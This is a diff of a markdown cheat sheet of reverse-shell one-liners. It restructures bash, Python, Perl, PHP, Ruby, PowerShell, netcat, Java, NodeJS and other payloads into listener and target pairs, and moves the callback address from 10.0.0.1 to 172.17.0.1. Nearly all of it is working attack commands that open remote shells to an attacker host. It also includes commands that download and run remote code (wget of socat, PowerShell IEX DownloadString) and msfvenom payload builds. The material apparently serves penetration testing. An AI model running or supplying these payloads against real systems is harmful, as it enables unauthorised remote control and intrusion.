@@ -1,87 +1,222 @@
 # Reverse Shells
+## Consider inserting `rlwrap` before the ncat listener command
 
-# Bash TCP
-bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+# Bash v1 TCP
+Listener:
+ncat -nlvp 4242
 
-0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+On Target:
+bash -i >& /dev/tcp/172.17.0.1/4242 0>&1
 
-# Bash UDP
-Victim:
-sh -i >& /dev/udp/10.0.0.1/4242 0>&1
+# Bash v2 TCP
+Listener:
+ncat -nlvp 4242
 
+On Target:
+0<&196;exec 196<>/dev/tcp/172.17.0.1/4242; sh <&196 >&196 2>&196
+
+# Bash v3 UDP
 Listener:
 nc -u -lvp 4242
 
+On Target:
+sh -i >& /dev/udp/172.17.0.1/4242 0>&1
+
+
 # Socat
-user@attack$ socat file:`tty`,raw,echo=0 TCP-L:4242
-user@victim$ /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
-user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
+## Static socat binary can be found at:
+## [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
+Listener: 
+socat file:`tty`,raw,echo=0 TCP-L:4242
 
-Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
+On Target (with socat installed):
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.17.0.1:4242
 
-# Perl
-perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
-
-perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+On Target (with no socat installed):
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.17.0.1:4242
 
 
-NOTE: Windows only
-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"10.0.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+# Perl v1
+Listener:
+ncat -nlvp 4242
 
-# Python
-## Linux only
+On Target:
+perl -e 'use Socket;$i="172.17.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
-IPv4
-export RHOST="10.0.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+# Perl v2 (works on older systems)
+Listener:
+ncat -nlvp 4242
 
-IPv4
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+On Target:
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.17.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 
-IPv6
+if we get an error about a parameterless use of IO we can try:
+perl -e 'use IO qw(Socket);$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.17.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+On Target (Windows only):
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"172.17.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+
+# Python v1
+Listener:
+ncat -nlvp 4242
+
+On Target (Unix):
+export RHOST="172.17.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+# Python v2
+Listener:
+ncat -nlvp 4242
+
+On Target (Unix):
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+# Python v3
+Listener:
+ncat -nlvp 4242
+
+On Target (Unix):
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Python v4
+Listener:
+ncat -nlvp 4242
+
+On Target (IPv6/Unix):
 python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
 
-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+# Python v5
+Listener:
+ncat -nlvp 4242
 
-## Windows only
+On Target (Windows):
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('172.17.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 
-C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 
-# PHP
-php -r '$sock=fsockopen("10.0.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
-php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+# PHP v1
+Listener:
+ncat -nlvp 4242
 
-# Ruby
-ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+On Target:
+php -r '$sock=fsockopen("172.17.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'
 
-NOTE: Windows only
-ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+# PHP v2
+Listener:
+ncat -nlvp 4242
+
+On Target:
+php -r '$sock=fsockopen("172.17.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+# PHP v3
+Listener:
+ncat -nlvp 4242
+
+On Target:
+php -r '$s=fsockopen("172.17.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP v4
+Listener:
+ncat -nlvp 4242
+
+On Target:
+php -r '$s=fsockopen("172.17.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'
+
+# PHP v5
+Listener:
+ncat -nlvp 4242
+
+On Target:
+php -r '$s=fsockopen("172.17.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP v6
+Listener:
+ncat -nlvp 4242
+
+On Target:
+php -r '$s=fsockopen("172.17.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+
+# Ruby v1 Unix
+Listener:
+ncat -nlvp 4242
+
+On Target (Unix):
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.17.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Ruby v2 Unix
+Listener:
+ncat -nlvp 4242
+
+On Target (Unix):
+ruby -rsocket -e 'f=TCPSocket.open("172.17.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Ruby v3 Windows
+Listener:
+ncat -nlvp 4242
+
+On Target (Windows):
+ruby -rsocket -e 'c=TCPSocket.new("172.17.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
 
 # Golang
-echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.0.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+Listener:
+ncat -nlvp 4242
 
-# Netcat Traditional
-nc -e /bin/sh 10.0.0.1 4242
-nc -e /bin/bash 10.0.0.1 4242
-nc -c bash 10.0.0.1 4242
+On Target:
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","172.17.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 
-# Netcat Windows/Linux
-nc -nvlp 5555
-nc -nv 192.168.20.20 5555 -e cmd.exe # windows 
-nc -nv 192.168.20.20 5555 -e /bin/bash # *nix
+# Netcat Traditional v1
+Listener:
+ncat -nlvp 4242
+
+On Target:
+nc -e /bin/sh 172.17.0.1 4242
+
+# Netcat Traditional v2
+Listener:
+ncat -nlvp 4242
+
+On Target:
+nc -e /bin/bash 172.17.0.1 4242
+
+# Netcat Traditional v3
+Listener:
+ncat -nlvp 4242
+
+On Target:
+nc -c bash 172.17.0.1 4242
+
+# Netcat Traditional v4 (Windows/Linux)
+Listener:
+ncat -nlvp 4242
+
+On Target (Windows):
+nc -nv 172.17.0.1 4242 -e cmd.exe     # windows 
+On Target (Unix):
+nc -nv 172.17.0.1 4242 -e /bin/bash   # *nix
 
 # Netcat OpenBsd
+Listener:
+ncat -nlvp 4242
 
-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+On Target:
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.17.0.1 4242 >/tmp/f
 
-# Ncat
+# Ncat v1 TCP
+Listener:
+ncat -nlvp 4242
 
-ncat 10.0.0.1 4242 -e /bin/bash
-ncat --udp 10.0.0.1 4242 -e /bin/bash
+On Target:
+ncat 172.17.0.1 4242 -e /bin/bash
 
-# Xterm
+# Ncat v2 UDP
+Listener:
+ncat -nulvp 4242
 
-## Procedure 1
+On Target:
+ncat --udp 172.17.0.1 4242 -e /bin/bash
+
+# Xterm v1
 To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with Xnest:
 Xnest :1
 
@@ -91,19 +226,19 @@ xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
 xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server
 
 Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
-xterm -display attackerip:1
+xterm -display <attackerip>:1
 
 Or:
 $ DISPLAY=attackerip:0 xterm
 
 It will try to connect back to you, attackerip, on TCP port 6001.
 Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:
-/usr/openwin/bin/xterm -display attackerip:1
+/usr/openwin/bin/xterm -display <attackerip>:1
 
-## Procedure 2
+# Xterm v2
 The following commands should be run on the server. They will try to connect back to you 
-where in this case your IP address is e.g. 10.0.0.1 and on TCP port 6001.
-xterm -display 10.0.0.1:1
+where in this case your IP address is e.g. 172.17.0.1 and on TCP port 6001.
+xterm -display 172.17.0.1:1
 
 Before catching the incoming xterm, we must authorize the user to connect to 
 our X-server with:
@@ -116,65 +251,92 @@ to do this is by using Xnest, so on our system we will issue:
 Xnest :1
 
 # OpenSSL
-Attacker:
-user@attack$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
-user@attack$ openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
+Listener:
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
 or
-user@attack$ ncat --ssl -vv -l -p 4242
+ncat --ssl -vv -l -p 4242
 
-user@victim$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 10.0.0.1:4242 > /tmp/s; rm /tmp/s
+On Target:
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.17.0.1:4242 > /tmp/s; rm /tmp/s
 
-# Powershell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+# Powershell v1
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("172.17.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+# Powershell v2
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.17.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
+# Powershell v3
 powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
 
 # Awk
-awk 'BEGIN {s = "/inet/tcp/0/10.0.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+Listener:
+ncat -nlvp 4242
 
-# Java
+On Target:
+awk 'BEGIN {s = "/inet/tcp/0/172.17.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+# Java v1
+Listener:
+ncat -nlvp 4242
+
+On Target:
 r = Runtime.getRuntime()
-p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/172.17.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
 p.waitFor()
 
 
-## Java Alternative 1
-String host="127.0.0.1";
+## Java v2
+Listener:
+ncat -nlvp 4242
+
+On Target:
+String host="172.17.0.1";
 int port=4444;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
 
-## Java Alternative 2
+## Java v3
+Listener:
+ncat -nlvp 4242
+
 //**NOTE**: This is more stealthy
 Thread thread = new Thread(){
     public void run(){
-        // Reverse shell here
+        // put reverse shell code here 
     }
 }
 thread.start();
 
-# War
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f war > reverse.war
+# Java v4 War
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f war > reverse.war
 strings reverse.war | grep jsp # in order to get the name of the file
 
 
-# Lua
-Linux only
-lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+# Lua v1 Linux
+Listener:
+ncat -nlvp 4242
 
-Windows and Linux
-lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('172.17.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"
 
-# NodeJS
+# Lua v2 Windows and Linux
+Listener:
+ncat -nlvp 4242
+
+lua5.1 -e 'local host, port = "172.17.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+
+# NodeJS v1
+Listener:
+ncat -nlvp 4242
+
+
 (function(){
     var net = require("net"),
         cp = require("child_process"),
         sh = cp.spawn("/bin/sh", []);
     var client = new net.Socket();
-    client.connect(4242, "10.0.0.1", function(){
+    client.connect(4242, "172.17.0.1", function(){
         client.pipe(sh.stdin);
         sh.stdout.pipe(client);
         sh.stderr.pipe(client);
@@ -183,135 +345,49 @@ lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") 
 })();
 
 
-or
+# NodeJS v2
+Listener:
+ncat -nlvp 4242
 
-require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242')
+require('child_process').exec('nc -e /bin/sh 172.17.0.1 4242')
 
-or
+# NodeJS v3
+Listener:
+ncat -nlvp 4242
 
 -var x = global.process.mainModule.require
--x('child_process').exec('nc 10.0.0.1 4242 -e /bin/bash')
+-x('child_process').exec('nc 172.17.0.1 4242 -e /bin/bash')
 
-or
+# NodeJS v4
+Listener:
+ncat -nlvp 4242
 
 https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
 
-# Groovy
-by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
-NOTE: Java reverse shell also work for Groovy
+# Groovy v1
+Listener:
+ncat -nlvp 4242
 
-String host="10.0.0.1";
+by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
+NOTE: Java reverse shell also works for Groovy
+
+String host="172.17.0.1";
 int port=4242;
 String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 
-## Groovy Alternative 1
+# Groovy v2
 **NOTE**: This is more stealthy
 
 Thread.start {
     // Reverse shell here
 }
 
-## Meterpreter Shell
-
-# Windows Staged reverse TCP
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
-
-# Windows Stageless reverse TCP
-msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f exe > reverse.exe
-
-# Linux Staged reverse TCP
-msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
-
-# Linux Stageless reverse TCP
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4242 -f elf >reverse.elf
-
-# Other platforms
-$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f elf > shell.elf
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f exe > shell.exe
-$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f macho > shell.macho
-$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f asp > shell.asp
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.jsp
-$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f war > shell.war
-$ msfvenom -p cmd/unix/reverse_python LHOST="10.0.0.1" LPORT=4242 -f raw > shell.py
-$ msfvenom -p cmd/unix/reverse_bash LHOST="10.0.0.1" LPORT=4242 -f raw > shell.sh
-$ msfvenom -p cmd/unix/reverse_perl LHOST="10.0.0.1" LPORT=4242 -f raw > shell.pl
-$ msfvenom -p php/meterpreter_reverse_tcp LHOST="10.0.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
-
-## Spawn TTY Shell
-In order to catch a shell, you need to listen on the desired port.
-`rlwrap` will enhance the shell, allowing you to clear the
-screen with `[CTRL] + [L]`.
-
-rlwrap nc 10.0.0.1 4242
-
-rlwrap -r -f . nc 10.0.0.1 4242
--f . will make rlwrap use the current history file as a completion word list.
--r Put all words seen on in- and output on the completion list.
-
-Sometimes, you want to access shortcuts, su, nano and autocomplete in a partially tty shell.
-
-:warning: OhMyZSH might break this trick, a simple `sh` is recommended
-
-> The main problem here is that zsh doesn't handle the stty command the same way bash or sh does. [...] stty raw -echo; fg[...] If you try to execute this as two separated commands, as soon as the prompt appear for you to execute the fg command, your -echo command already lost its effect
-
-ctrl+z
-echo $TERM && tput lines && tput cols
-
-# for bash
-stty raw -echo
-fg
-
-# for zsh
-stty raw -echo; fg
-
-reset
-export SHELL=bash
-export TERM=xterm-256color
-stty rows <num> columns <cols>
-
-or use `socat` binary to get a fully tty reverse shell
-
-socat file:`tty`,raw,echo=0 tcp-listen:12345
-
-Spawn a TTY shell from an interpreter
-
-/bin/sh -i
-python3 -c 'import pty; pty.spawn("/bin/sh")'
-python3 -c "__import__('pty').spawn('/bin/bash')"
-python3 -c "__import__('subprocess').call(['/bin/bash'])"
-perl -e 'exec "/bin/sh";'
-perl: exec "/bin/sh";
-perl -e 'print `/bin/bash`'
-ruby: exec "/bin/sh"
-lua: os.execute('/bin/sh')
-
-- vi: `:!bash`
-- vi: `:set shell=/bin/bash:shell`
-- nmap: `!sh`
-- mysql: `! bash`
-
-## Fully interactive reverse shell on Windows
-The introduction of the Pseudo Console (ConPty) in Windows has improved so much the way Windows handles terminals.
-
-**ConPtyShell uses the function [CreatePseudoConsole()](https://docs.microsoft.com/en-us/windows/console/createpseudoconsole). This function is available since Windows 10 / Windows Server 2019 version 1809 (build 10.0.17763).**
-
-
-Server Side:
-
-stty raw -echo; (stty size; cat) | nc -lvnp 3001
-
-Client Side:
-
-IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
-
-Offline version of the ps1 available at --> https://github.com/antonioCoco/ConPtyShell/blob/master/Invoke-ConPtyShell.ps1
 
 # C
-
-A reverse shell in C can be done with the following code,
-notice that we have to modify the two constants 
-`REMOTE_ADDR` and `REMOTE_PORT`.
+## A reverse shell in C can be done with the following code,
+## notice that we have to modify the two constants 
+## `REMOTE_ADDR` and `REMOTE_PORT`.
 
 ```c
 /* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
@@ -321,8 +397,8 @@ notice that we have to modify the two constants
 #include <sys/types.h>
 #include <sys/socket.h>
 
-#define REMOTE_ADDR "XXX.XXX.XXX.XXX"
